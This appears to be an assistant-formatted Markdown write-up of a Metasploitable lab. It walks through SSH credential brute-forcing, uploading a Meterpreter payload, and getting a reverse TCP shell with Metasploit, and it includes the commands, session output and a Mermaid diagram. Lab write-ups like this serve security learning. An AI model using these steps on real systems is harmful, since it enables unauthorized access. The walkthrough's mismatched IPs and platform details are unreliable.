Here’s your **complete Markdown report** with the first-person walkthrough **and** the Mermaid diagram included. You can save it as a `.md` file and view it in any Markdown viewer that supports Mermaid.

````markdown
# My Walkthrough: Gaining a Meterpreter Reverse TCP on Metasploitable

## 1️⃣ SSH Login via Metasploit

I started by using Metasploit’s `auxiliary/scanner/ssh/ssh_login` module to brute-force SSH on my target machine (`192.168.56.117`).

```text
exploit
````

I successfully logged in with:

```
Username: vagrant
Password: vagrant
```

Metasploit opened two SSH sessions for me:

```
Session 2 & 3: shell linux
```

---

## 2️⃣ Uploading the Payload and Initial Execution Attempt

I uploaded my Windows payload via Metasploit:

```text
upload /home/yumi/meter.exe /home/vagrant/meter.exe
```

The upload succeeded:

```
[+] File /home/vagrant/meter.exe upload finished
```

However, when I tried to execute it in my Metasploit shell:

```text
./meter.exe
```

I got:

```
-bash: ./meter.exe: cannot execute binary file
```

I realized the payload was **Windows-only**, and it wouldn’t run on Linux.

---

## 3️⃣ Using Remmina and a Shared Folder

Since I couldn’t execute the payload in my Metasploit shell, I connected to the target using **Remmina (RDP client)**. I created a **shared folder** pointing to where `meter.exe` was located on the target.

This allowed me to **execute the payload from within the RDP session**, which triggered a connection back to my host.

---

## 4️⃣ Getting the Meterpreter Reverse Shell

After executing the payload via the shared folder, Metasploit received the reverse shell:

```text
[*] Sending stage (177734 bytes) to 192.168.56.107
[*] Meterpreter session 4 opened (192.168.56.106:4444 -> 192.168.56.107:49485)
[*] Sending stage (177734 bytes) to 192.168.56.107
[*] Meterpreter session 5 opened (192.168.56.106:4444 -> 192.168.56.107:49487)
```

I now had **full Meterpreter sessions** on the target, giving me remote control.

---

## 5️⃣ Enumerating the Target

I explored the target’s directories:

```text
ls
# Shows all user directories
whoami
# vagrant
```

I confirmed that I was logged in as `vagrant`. I also verified that Python and Bash were available:

```text
[*] Found python at /usr/bin/python
[*] Found bash at /bin/bash
```

This allowed me to open interactive shells and continue exploring the system.

---

## 6️⃣ Key Takeaways

* **Execution issue**: I couldn’t run `meter.exe` in the Metasploit shell because it’s a Windows payload.
* **Remmina + shared folder**: This was crucial to executing the payload successfully on the target.
* **Reverse TCP**: Executing the payload triggered a reverse TCP connection, giving me full Meterpreter access.
* **OS compatibility**: Always consider the target OS; reverse shells can bypass direct execution limitations.

---

## 7️⃣ Workflow Diagram

```mermaid
flowchart TD
    A[Start] --> B[SSH Login via Metasploit]
    B --> C[Upload meter.exe via Metasploit]
    C --> D[Try executing in Metasploit shell]
    D --> E[Execution fails - Windows payload on Linux]
    E --> F[Connect via Remmina (RDP)]
    F --> G[Create shared folder pointing to payload]
    G --> H[Execute meter.exe via shared folder]
    H --> I[Reverse TCP connection triggered]
    I --> J[Meterpreter sessions opened (full control)]
    J --> K[Enumerate target, check users, open interactive shells]
    K --> L[End]
```

This diagram visually represents my full workflow, from SSH login to gaining a Meterpreter reverse TCP session on the target.

```
